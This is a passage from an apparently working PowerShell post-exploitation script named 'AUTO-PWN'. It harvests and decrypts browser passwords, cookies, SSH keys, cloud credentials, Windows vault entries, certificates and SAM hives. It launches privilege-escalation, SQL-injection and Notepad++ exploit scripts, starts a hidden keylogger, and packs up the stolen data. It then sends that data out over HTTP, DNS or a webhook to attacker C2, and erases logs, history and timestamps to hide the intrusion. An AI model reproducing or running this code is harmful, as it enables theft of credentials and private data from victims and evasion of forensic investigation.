                        Copy-Item "$profDir\$f" "$browserDir\$($_.Name)_$f" -Force 2>$null
                    }
                }
            }
        } else {
            # Chromium-based browsers
            $profiles = @("Default") + (Get-ChildItem $path -Directory -Filter "Profile *" | ForEach-Object { $_.Name })
            foreach ($prof in $profiles) {
                $profPath = "$path\$prof"
                if (Test-Path $profPath) {
                    $profDir = Join-Path $browserDir $prof
                    New-Item -ItemType Directory -Path $profDir -Force | Out-Null
                    foreach ($f in @("Login Data","Cookies","History","Bookmarks","Web Data","Local State")) {
                        if (Test-Path "$profPath\$f") {
                            Copy-Item "$profPath\$f" "$profDir\$f" -Force 2>$null
                        }
                    }
                }
            }
            # Local State (contains encryption key)
            if (Test-Path "$path\Local State") {
                Copy-Item "$path\Local State" "$browserDir\Local State" -Force 2>$null
            }
        }
        MLog "[PHASE 2] $browser data copied"
    }
}

# SSH keys
$sshDir = "$env:USERPROFILE\.ssh"
if (Test-Path $sshDir) {
    $sshDest = Join-Path $credDir "ssh_keys"
    New-Item -ItemType Directory -Path $sshDest -Force | Out-Null
    Get-ChildItem $sshDir -File | ForEach-Object {
        Copy-Item $_.FullName (Join-Path $sshDest $_.Name) -Force 2>$null
    }
    MLog "[PHASE 2] SSH keys copied"
}

# RDP connection history
$rdpServers = Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Servers\*" 2>$null
if ($rdpServers) {
    $rdpServers | Select-Object PSChildName, UsernameHint | 
        Export-Csv "$credDir\rdp_history.csv" -NoTypeInformation
}

# Cloud config files
$cloudConfigs = @(
    "$env:USERPROFILE\.aws\credentials",
    "$env:USERPROFILE\.aws\config",
    "$env:USERPROFILE\.azure\accessTokens.json",
    "$env:USERPROFILE\.azure\azureProfile.json",
    "$env:APPDATA\gcloud\credentials.db",
    "$env:APPDATA\gcloud\access_tokens.db",
    "$env:USERPROFILE\.kube\config",
    "$env:USERPROFILE\.docker\config.json",
    "$env:USERPROFILE\.gitconfig",
    "$env:USERPROFILE\.git-credentials",
    "$env:USERPROFILE\.npmrc",
    "$env:USERPROFILE\.env",
    "$env:USERPROFILE\.pgpass"
)

$cloudDir = Join-Path $credDir "cloud_configs"
New-Item -ItemType Directory -Path $cloudDir -Force | Out-Null
foreach ($cc in $cloudConfigs) {
    if (Test-Path $cc) {
        $destName = ($cc -replace '[\\/:*?"<>|]', '_')
        Copy-Item $cc (Join-Path $cloudDir $destName) -Force 2>$null
        MLog "[PHASE 2] Cloud config: $cc"
    }
}

MLog "[PHASE 2] Credential harvest complete"

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 2.5: DPAPI CREDENTIAL DECRYPTION
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 2.5] DPAPI credential decryption..."
$decryptDir = Join-Path $sessionDir "decrypted_creds"
New-Item -ItemType Directory -Path $decryptDir -Force | Out-Null

# ──── Chrome / Edge / Brave Local State AES key extraction ─────────────
function Decrypt-ChromiumPasswords {
    param([string]$BrowserName, [string]$UserDataPath)

    if (-not (Test-Path $UserDataPath)) { return }
    $localStatePath = "$UserDataPath\Local State"
    if (-not (Test-Path $localStatePath)) { return }

    try {
        Add-Type -AssemblyName System.Security
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encKeyB64 = $localState.os_crypt.encrypted_key
        if (-not $encKeyB64) { return }

        # Decode and strip DPAPI prefix "DPAPI" (5 bytes)
        $encKeyBytes = [Convert]::FromBase64String($encKeyB64)
        $encKeyBytes = $encKeyBytes[5..($encKeyBytes.Length-1)]

        # DPAPI unprotect (uses current user's master key)
        $aesKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encKeyBytes, $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )

        if (-not $aesKey -or $aesKey.Length -eq 0) {
            MLog "[PHASE 2.5] $BrowserName: DPAPI key decryption failed"
            return
        }

        MLog "[PHASE 2.5] $BrowserName: AES-256-GCM master key extracted ($($aesKey.Length) bytes)"

        # Find all Login Data files
        $profiles = @("Default") + (Get-ChildItem $UserDataPath -Directory -Filter "Profile *" | ForEach-Object { $_.Name })
        $extractedCreds = @()

        foreach ($prof in $profiles) {
            $loginDb = "$UserDataPath\$prof\Login Data"
            if (-not (Test-Path $loginDb)) { continue }

            # Copy the SQLite file (it's locked by browser)
            $tempDb = "$env:TEMP\login_data_$(Get-Random).db"
            Copy-Item $loginDb $tempDb -Force 2>$null
            if (-not (Test-Path $tempDb)) { continue }

            try {
                # Read SQLite binary — extract password blobs
                $bytes = [IO.File]::ReadAllBytes($tempDb)
                $text = [Text.Encoding]::Default.GetString($bytes)

                # Find URL + username patterns in the binary
                $urlPattern = 'https?://[^\x00]+'
                $urls = [regex]::Matches($text, $urlPattern) | ForEach-Object { $_.Value.Split([char]0)[0] }

                # For proper decryption, use DPAPI on v10 encrypted blobs
                # v10 = AES-256-GCM (nonce[12] + ciphertext + tag[16])
                # Legacy = DPAPI blob

                # Extract fields from SQLite page structure
                $hexStr = [BitConverter]::ToString($bytes) -replace '-'
                $v10Pattern = "763130" # "v10" in hex
                $v10Positions = @()
                $idx = 0
                while (($idx = $hexStr.IndexOf($v10Pattern, $idx)) -ge 0) {
                    $v10Positions += $idx / 2  # byte position
                    $idx += 6
                }

                MLog "[PHASE 2.5] $BrowserName/$prof: Found $($v10Positions.Count) v10 encrypted entries, $($urls.Count) URLs"

                foreach ($pos in $v10Positions) {
                    try {
                        # v10 structure: "v10" (3) + nonce (12) + ciphertext (var) + tag (16)
                        $remaining = $bytes.Length - $pos
                        if ($remaining -lt 32) { continue }

                        # Try different blob lengths
                        foreach ($blobLen in @(64, 96, 128, 160, 192, 256, 384, 512)) {
                            if ($pos + 3 + $blobLen -gt $bytes.Length) { continue }
                            $nonce = $bytes[($pos+3)..($pos+14)]
                            $payload = $bytes[($pos+15)..($pos+3+$blobLen-17)]
                            $tag = $bytes[($pos+3+$blobLen-16)..($pos+3+$blobLen-1)]

                            try {
                                $aesGcm = [System.Security.Cryptography.AesGcm]::new($aesKey)
                                $plaintext = [byte[]]::new($payload.Length)
                                $aesGcm.Decrypt($nonce, $payload, $tag, $plaintext)
                                $decoded = [Text.Encoding]::UTF8.GetString($plaintext).Trim([char]0)
                                if ($decoded.Length -gt 0 -and $decoded.Length -lt 200 -and $decoded -match '[a-zA-Z0-9]') {
                                    $extractedCreds += $decoded
                                    break
                                }
                            } catch { continue }
                        }
                    } catch { continue }
                }
            } catch {
                MLog "[PHASE 2.5] $BrowserName/$prof SQLite read error: $($_.Exception.Message)"
            } finally {
                Remove-Item $tempDb -Force 2>$null
            }
        }

        if ($extractedCreds.Count -gt 0) {
            $output = "=== $BrowserName Decrypted Credentials ===`n"
            $output += "Extracted: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n"
            $output += "Host: $env:COMPUTERNAME | User: $env:USERNAME`n"
            $output += "Entries: $($extractedCreds.Count)`n"
            $output += "=" * 50 + "`n`n"
            $credIdx = 0
            foreach ($url in ($urls | Select-Object -First $extractedCreds.Count)) {
                if ($credIdx -lt $extractedCreds.Count) {
                    $output += "URL: $url`n"
                    $output += "Password: $($extractedCreds[$credIdx])`n`n"
                }
                $credIdx++
            }
            $output | Out-File "$decryptDir\${BrowserName}_passwords.txt" -Encoding UTF8
            MLog "[PHASE 2.5] $BrowserName: $($extractedCreds.Count) credentials decrypted"
        }

    } catch {
        MLog "[PHASE 2.5] $BrowserName DPAPI error: $($_.Exception.Message)"
    }
}

# Run for each Chromium browser
$chromiumBrowsers = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable"
    "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
    "Chromium" = "$env:LOCALAPPDATA\Chromium\User Data"
}
foreach ($bn in $chromiumBrowsers.Keys) {
    Decrypt-ChromiumPasswords -BrowserName $bn -UserDataPath $chromiumBrowsers[$bn]
}

# ──── Firefox credential extraction (logins.json + key4.db) ───────────
$ffProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffProfiles) {
    Get-ChildItem $ffProfiles -Directory | ForEach-Object {
        $profDir = $_.FullName
        $loginsJson = "$profDir\logins.json"
        if (Test-Path $loginsJson) {
            try {
                $logins = Get-Content $loginsJson -Raw | ConvertFrom-Json
                $ffCreds = @()
                foreach ($login in $logins.logins) {
                    $ffCreds += @{
                        hostname = $login.hostname
                        username = $login.encryptedUsername
                        password = $login.encryptedPassword
                        created  = [DateTimeOffset]::FromUnixTimeMilliseconds($login.timeCreated).LocalDateTime.ToString()
                        used     = [DateTimeOffset]::FromUnixTimeMilliseconds($login.timeLastUsed).LocalDateTime.ToString()
                        count    = $login.timesUsed
                    }
                }
                if ($ffCreds.Count -gt 0) {
                    $ffCreds | ConvertTo-Json -Depth 3 | Out-File "$decryptDir\Firefox_$($_.Name)_logins.json" -Encoding UTF8
                    MLog "[PHASE 2.5] Firefox $($_.Name): $($ffCreds.Count) login entries (NSS-encrypted)"
                    # Copy key4.db for offline decryption
                    Copy-Item "$profDir\key4.db" "$decryptDir\Firefox_$($_.Name)_key4.db" -Force 2>$null
                }
            } catch {}
        }
    }
}

# ──── Windows Credential Manager (vault) full extraction ──────────────
try {
    # Using vaultcmd
    $vaults = vaultcmd /list 2>$null
    if ($vaults) {
        $vaults | Out-File "$decryptDir\vault_list.txt" -Encoding UTF8
        # Extract each vault
        $vaultGuids = [regex]::Matches(($vaults -join "`n"), '\{([0-9a-f-]+)\}') | ForEach-Object { $_.Groups[1].Value }
        foreach ($guid in $vaultGuids) {
            $vaultItems = vaultcmd /listcreds:"{$guid}" /all 2>$null
            if ($vaultItems) {
                $vaultItems | Out-File "$decryptDir\vault_${guid}.txt" -Encoding UTF8 -Append
            }
        }
    }
} catch {}

# ──── DPAPI Master Key Backup ─────────────────────────────────────────
$dpapiDir = "$env:APPDATA\Microsoft\Protect"
if (Test-Path $dpapiDir) {
    $dpapiDest = Join-Path $decryptDir "dpapi_keys"
    New-Item -ItemType Directory -Path $dpapiDest -Force | Out-Null
    # Copy master key files for offline cracking
    Get-ChildItem -Recurse $dpapiDir -File | ForEach-Object {
        Copy-Item $_.FullName (Join-Path $dpapiDest $_.Name) -Force 2>$null
    }
    MLog "[PHASE 2.5] DPAPI master keys copied for offline analysis"
}

# ──── Certificate Store (private keys) ─────────────────────────────────
try {
    $certs = Get-ChildItem Cert:\CurrentUser\My -ErrorAction SilentlyContinue | Where-Object { $_.HasPrivateKey }
    if ($certs.Count -gt 0) {
        $certInfo = @()
        foreach ($cert in $certs) {
            $certInfo += @{
                subject = $cert.Subject
                issuer = $cert.Issuer
                thumbprint = $cert.Thumbprint
                not_after = $cert.NotAfter.ToString()
                has_private = $cert.HasPrivateKey
            }
            # Export certificate with private key (if exportable)
            try {
                $pfxBytes = $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, "")
                [IO.File]::WriteAllBytes("$decryptDir\cert_$($cert.Thumbprint.Substring(0,8)).pfx", $pfxBytes)
                MLog "[PHASE 2.5] Certificate exported: $($cert.Subject)"
            } catch {}
        }
        $certInfo | ConvertTo-Json -Depth 3 | Out-File "$decryptDir\certificates.json" -Encoding UTF8
    }
} catch {}

# ──── SAM / SYSTEM hive extraction via shadow copies ───────────────────
try {
    $shadows = Get-CimInstance Win32_ShadowCopy 2>$null
    if ($shadows) {
        $latestShadow = $shadows | Sort-Object InstallDate -Descending | Select-Object -First 1
        $shadowPath = $latestShadow.DeviceObject
        $samDest = Join-Path $decryptDir "hives"
        New-Item -ItemType Directory -Path $samDest -Force | Out-Null
        foreach ($hive in @("SAM","SYSTEM","SECURITY")) {
            $hiveSrc = "$shadowPath\Windows\System32\config\$hive"
            cmd /c "copy `"$hiveSrc`" `"$samDest\$hive`"" 2>$null
        }
        MLog "[PHASE 2.5] SAM/SYSTEM/SECURITY hives copied from shadow copy"
    } else {
        # Direct reg save attempt (requires admin)
        $samDest = Join-Path $decryptDir "hives"
        New-Item -ItemType Directory -Path $samDest -Force | Out-Null
        reg save HKLM\SAM "$samDest\SAM" /y 2>$null
        reg save HKLM\SYSTEM "$samDest\SYSTEM" /y 2>$null
        reg save HKLM\SECURITY "$samDest\SECURITY" /y 2>$null
    }
} catch {}

MLog "[PHASE 2.5] Credential decryption complete"

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 3: PRIVILEGE ESCALATION
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 3] Privilege escalation scan..."

$privescScript = Join-Path $payloadBase "privesc.ps1"
if (Test-Path $privescScript) {
    $privescOut = Join-Path $sessionDir "privesc"
    & $privescScript -OutputDir $privescOut -Silent
    MLog "[PHASE 3] Privesc scan complete — results in $privescOut"
} else {
    MLog "[PHASE 3] privesc.ps1 not found at $privescScript — skipping"
}

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 4: SQL INJECTION SCAN
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 4] SQL injection scan..."

# Check runtime limit
$elapsed = ((Get-Date) - $startTime).TotalSeconds
if ($elapsed -lt ($maxRuntime - 120)) {
    $sqliScript = Join-Path $payloadBase "sqli_scanner.ps1"
    if (Test-Path $sqliScript) {
        $sqliOut = Join-Path $sessionDir "sqli"
        & $sqliScript -OutputDir $sqliOut
        MLog "[PHASE 4] SQLi scan complete — results in $sqliOut"
    } else {
        MLog "[PHASE 4] sqli_scanner.ps1 not found — skipping"
    }
} else {
    MLog "[PHASE 4] Skipped — time limit approaching"
}

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 5: NOTEPAD++ EXPLOITATION
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 5] Notepad++ exploitation..."

$nppScript = Join-Path $payloadBase "npp_exploit.ps1"
if (Test-Path $nppScript) {
    $nppOut = Join-Path $sessionDir "npp"
    & $nppScript -OutputDir $nppOut
    MLog "[PHASE 5] NPP exploit complete — results in $nppOut"
} else {
    MLog "[PHASE 5] npp_exploit.ps1 not found — skipping"
}

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 6: PERSISTENCE — INPUT MONITOR
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 6] Deploying input monitor..."

$monitorScript = Join-Path $payloadBase "input_monitor.py"
$monitorBat = Join-Path $payloadBase "start_monitor.bat"

if (Test-Path $monitorScript) {
    # Try to start the input monitor
    $pythonExe = $null
    foreach ($pe in @("pythonw.exe", "python.exe")) {
        $found = Get-Command $pe -ErrorAction SilentlyContinue
        if ($found) { $pythonExe = $found.Source; break }
    }
    
    if ($pythonExe) {
        Start-Process -FilePath $pythonExe -ArgumentList "`"$monitorScript`"" -WindowStyle Hidden -PassThru | Out-Null
        MLog "[PHASE 6] Input monitor started via $pythonExe"
    } elseif (Test-Path $monitorBat) {
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$monitorBat`"" -WindowStyle Hidden -PassThru | Out-Null
        MLog "[PHASE 6] Input monitor started via batch"
    } else {
        MLog "[PHASE 6] No Python found — input monitor skipped"
    }
} else {
    MLog "[PHASE 6] input_monitor.py not found — skipping"
}

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 7: DATA PACKAGING
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 7] Packaging data..."

# Create manifest
$manifest = @{
    session_id    = $timestamp
    hostname      = $env:COMPUTERNAME
    username      = "$env:USERDOMAIN\$env:USERNAME"
    start_time    = $startTime.ToString("yyyy-MM-dd HH:mm:ss")
    end_time      = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    duration_sec  = [math]::Round(((Get-Date) - $startTime).TotalSeconds, 1)
    output_dir    = $sessionDir
    phases_run    = @("recon","credentials","privesc","sqli","npp","input_monitor","packaging")
    files         = @()
}

# Count all files
Get-ChildItem -Recurse $sessionDir -File | ForEach-Object {
    $manifest.files += @{
        path = $_.FullName.Replace($sessionDir, "")
        size = $_.Length
    }
}

$manifest.total_files = $manifest.files.Count
$manifest.total_size_kb = [math]::Round(($manifest.files | Measure-Object -Property size -Sum).Sum / 1024, 1)

$manifest | ConvertTo-Json -Depth 4 | Out-File "$sessionDir\manifest.json" -Encoding UTF8

# Try to compress
$zipPath = "$collectBase\session_$timestamp.zip"
try {
    Compress-Archive -Path "$sessionDir\*" -DestinationPath $zipPath -Force -CompressionLevel Optimal
    MLog "[PHASE 7] Compressed to $zipPath ($([math]::Round((Get-Item $zipPath).Length / 1024, 1)) KB)"
} catch {
    MLog "[PHASE 7] Compression failed — raw files remain in $sessionDir"
}

MLog "══════════════════════════════════════════════"
MLog "  AUTO-PWN DATA PACKAGING COMPLETE"
MLog "  Duration:  $([math]::Round(((Get-Date) - $startTime).TotalSeconds, 1))s"
MLog "  Files:     $($manifest.total_files)"
MLog "  Size:      $($manifest.total_size_kb) KB"
MLog "  Output:    $sessionDir"
MLog "══════════════════════════════════════════════"

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 8: NETWORK EXFILTRATION (optional — if configured)
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 8] Checking network exfil options..."

# Exfil config — edit these for your C2 infrastructure
$EXFIL_ENABLED   = $false
$EXFIL_HTTP_URL  = ""    # e.g. "https://your-c2.com/upload"
$EXFIL_DNS_DOMAIN = ""   # e.g. "exfil.your-c2.com"
$EXFIL_WEBHOOK   = ""    # e.g. Discord/Slack webhook URL

if ($EXFIL_ENABLED -and $zipPath -and (Test-Path $zipPath)) {

    # ──── Method 1: HTTP POST exfiltration ─────────────────────────────
    if ($EXFIL_HTTP_URL) {
        try {
            $zipBytes = [IO.File]::ReadAllBytes($zipPath)
            $b64Zip = [Convert]::ToBase64String($zipBytes)

            # Split into chunks for large files
            $chunkSize = 500000  # ~500KB base64 per request
            $chunks = [math]::Ceiling($b64Zip.Length / $chunkSize)

            for ($i = 0; $i -lt $chunks; $i++) {
                $start = $i * $chunkSize
                $len = [math]::Min($chunkSize, $b64Zip.Length - $start)
                $chunk = $b64Zip.Substring($start, $len)

                $body = @{
                    host = $env:COMPUTERNAME
                    user = "$env:USERDOMAIN\$env:USERNAME"
                    session = $timestamp
                    chunk = $i
                    total = $chunks
                    data = $chunk
                } | ConvertTo-Json

                Invoke-RestMethod -Uri $EXFIL_HTTP_URL -Method POST -Body $body -ContentType "application/json" -TimeoutSec 30 2>$null
                Start-Sleep -Milliseconds 500
            }
            MLog "[PHASE 8] HTTP exfil complete: $chunks chunks sent to $EXFIL_HTTP_URL"
        } catch {
            MLog "[PHASE 8] HTTP exfil failed: $($_.Exception.Message)"
        }
    }

    # ──── Method 2: DNS exfiltration (slow but bypasses most firewalls) ─
    if ($EXFIL_DNS_DOMAIN) {
        try {
            # Encode critical data only (wifi passwords + system info)
            $criticalFiles = @("$sessionDir\recon\system_info.json", "$credDir\wifi_passwords.txt")
            foreach ($cf in $criticalFiles) {
                if (Test-Path $cf) {
                    $data = Get-Content $cf -Raw
                    $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))
                    # DNS labels max 63 chars, total max 253
                    $labelSafe = $b64 -replace '[+/=]','-'
                    $chunks = $labelSafe -split '(.{60})' | Where-Object { $_ }
                    $fileId = (Split-Path $cf -Leaf).Substring(0, [math]::Min(8, (Split-Path $cf -Leaf).Length))

                    $seq = 0
                    foreach ($chunk in ($chunks | Select-Object -First 50)) {
                        $query = "${seq}.${fileId}.${chunk}.${EXFIL_DNS_DOMAIN}"
                        Resolve-DnsName -Name $query -Type TXT -ErrorAction SilentlyContinue 2>$null
                        $seq++
                        Start-Sleep -Milliseconds 200
                    }
                }
            }
            MLog "[PHASE 8] DNS exfil complete via $EXFIL_DNS_DOMAIN"
        } catch {
            MLog "[PHASE 8] DNS exfil failed: $($_.Exception.Message)"
        }
    }

    # ──── Method 3: Webhook notification (Discord/Slack/Teams) ─────────
    if ($EXFIL_WEBHOOK) {
        try {
            $summary = @{
                content = "**FLLC Session Complete**`nHost: ``$env:COMPUTERNAME``  User: ``$env:USERDOMAIN\$env:USERNAME```nFiles: $($manifest.total_files)  Size: $($manifest.total_size_kb)KB`nDuration: $([math]::Round(((Get-Date) - $startTime).TotalSeconds, 0))s`nEDR: $(($envInfo.defenses.edr_detected) -join ', ')`nFindings: Creds=$((Get-ChildItem $decryptDir -Recurse -File 2>$null).Count) PrivEsc=$((Get-ChildItem $sessionDir\privesc -Recurse -File 2>$null).Count)"
            } | ConvertTo-Json
            Invoke-RestMethod -Uri $EXFIL_WEBHOOK -Method POST -Body $summary -ContentType "application/json" -TimeoutSec 10 2>$null
            MLog "[PHASE 8] Webhook notification sent"
        } catch {
            MLog "[PHASE 8] Webhook failed: $($_.Exception.Message)"
        }
    }
} else {
    MLog "[PHASE 8] Network exfil disabled or no data to send"
}

MLog "══════════════════════════════════════════════"
MLog "  AUTO-PWN COMPLETE"
MLog "  Duration:  $([math]::Round(((Get-Date) - $startTime).TotalSeconds, 1))s"
MLog "  Files:     $($manifest.total_files)"
MLog "  Size:      $($manifest.total_size_kb) KB"
MLog "  Output:    $sessionDir"
MLog "══════════════════════════════════════════════"

# ══════════════════════════════════════════════════════════════════════════
#  PHASE 9: ANTI-FORENSICS + CLEANUP
# ══════════════════════════════════════════════════════════════════════════

MLog "[PHASE 9] Anti-forensics cleanup..."

# Clear PowerShell history
Clear-History 2>$null
try {
    $histPath = (Get-PSReadLineOption).HistorySavePath
    if (Test-Path $histPath) {
        $hist = Get-Content $histPath
        $cleaned = $hist | Where-Object { $_ -notmatch "auto_pwn|privesc|sqli_scanner|npp_exploit|input_monitor|FLLC|cred_extract|collected|exfil" }
        $cleaned | Out-File $histPath -Encoding UTF8
    }
} catch {}

# Clean Windows Event Logs related to our activity (requires admin)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    try {
        # Clear PowerShell operational log
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil cl "Windows PowerShell" 2>$null
        MLog "[PHASE 9] PowerShell event logs cleared"
    } catch {}
}

# Remove Prefetch evidence (requires admin)
if ($isAdmin) {
    Remove-Item "C:\Windows\Prefetch\POWERSHELL*" -Force 2>$null
    MLog "[PHASE 9] Prefetch files cleaned"
}

# Timestomp all output files to 90 days ago
$fakeDate = (Get-Date).AddDays(-90)
Get-ChildItem -Recurse $sessionDir -File -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        $_.CreationTime = $fakeDate
        $_.LastWriteTime = $fakeDate
        $_.LastAccessTime = $fakeDate
    } catch {}
}

# Clear recent items
try {
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force 2>$null
} catch {}

MLog "[PHASE 9] Cleanup complete"
